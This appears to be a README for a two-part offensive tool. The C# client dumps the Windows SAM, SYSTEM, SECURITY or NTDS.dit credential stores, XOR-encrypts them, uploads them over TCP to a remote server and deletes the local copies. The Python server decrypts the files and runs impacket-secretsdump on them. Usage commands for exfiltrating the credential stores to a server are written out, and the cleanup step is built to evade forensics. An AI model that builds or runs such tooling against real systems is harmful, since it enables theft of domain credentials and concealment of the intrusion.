# Client side 

# **EsentutlDump**

EsentutlDump is a C# program that dumps the SYSTEM, SECURITY, SAM, or NTDS.dit files from the local Windows machine, encrypts them using XOR encryption and uploads the encrypted files to a remote server over TCP.

## **Features**

- Dumps SYSTEM, SECURITY, SAM, or NTDS.dit files
- Zips the dumped files
- Encrypts the zip file using XOR encryption with a specified key
- Uploads the encrypted file to a remote server via a TCP connection
- Deletes the original, zipped, and encrypted files from the local machine after uploading

## **Usage**

1. Ensure you have the .NET 6.0 SDK installed on your machine.
2. Compile the C# program using the following command in the terminal:

```
dotnet build
```

1. Run the compiled program with administrative privileges:

```
EsentutlDump.exe <Server_IP> <Port> sam

EsentutlDump.exe <Server_IP> <Port> ntds
```

**Note:** The program must be run with administrative privileges to access the SYSTEM, SAM, ntds.dit and SECURITY files.

## **Configuration**

You can change the XOR encryption key before running the program, update the following variables in the code:

- **`string key`**: Set this to the desired XOR encryption key (Default value is “RedKey”)

## **Dependencies**

This program uses the following built-in .NET libraries:

- System.Diagnostics
- System.IO.Compression
- System.Net.Sockets
- System.Security.Principal







# Server side

# **File Receiver with XOR and SecretsDump**

This Python script receives files from clients via a TCP connection, optionally decrypts them using an XOR cipher, and extracts the contents. If the **`--show`** argument is provided, it runs the **`impacket-secretsdump`** tool to display the contents of the extracted files.

## **Features**

- Receive files from clients via a TCP connection
- Optional XOR decryption of received files using a provided key
- Extraction of received zip files
- Optional execution of **`impacket-secretsdump`** on the extracted files
- Detection and handling of **`ntds.dit`** file presence in the extracted files
- Clean up and archive of extracted files

## **Dependencies**

- Python 3.9 or later
- **`impacket`** (for the **`impacket-secretsdump`** command)

You can install the **`impacket`** package using the following command:

```
pip install impacket

```

## **Usage**

To run the script, execute the following command:

```
python file_receiver.py --xor_key "RedKey" --show
```

Replace **`"RedKey"`** with the desired XOR key. If you don't provide the **`--xor_key`** argument, the script will run without decrypting the file.

### **Arguments**

- **`xor`** or **`-xor_key`**: Specifies the XOR key to be used for decrypting the received file. If not provided, no decryption will be performed.
- **`-show`**: Unzips the received file, decrypts it if an XOR key is provided, and runs the **`impacket-secretsdump`** command on the extracted files. If the **`ntds.dit`** file is present in the extracted files, the command will be adjusted accordingly.